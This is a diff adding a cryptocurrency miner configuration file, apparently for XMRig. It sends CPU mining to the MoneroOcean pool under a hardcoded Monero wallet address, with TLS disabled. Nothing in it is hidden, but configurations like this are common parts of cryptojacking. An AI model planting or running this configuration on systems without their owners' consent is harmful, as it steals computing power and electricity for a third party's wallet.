@@ -1,0 +1,26 @@
+{
+  "autosave": false,
+  "cpu": {
+    "enabled": true,
+
+    "cn-lite/0": false,
+    "cn/0": false,
+    "rx/xeq": false,
+    "rx/arq": false,
+    "rx/keva": false
+  },
+  "opencl": false,
+  "cuda": false,
+  "pools": [
+    {
+      "coin": null,
+      "algo": null,
+      "url": "gulf.moneroocean.stream:80",
+      "user": "453xdSmLFjcNDEWWTCHsptTMXHRBNf3ezHTf2mRQmvo2bgJxEtJafaNUFBTBau2yt7WJbWaFSpbYLAi9RobRzQUD97s9je1",
+      "pass": "Miner",
+      "tls": false,
+      "keepalive": true,
+      "nicehash": false
+    }
+  ]
+}
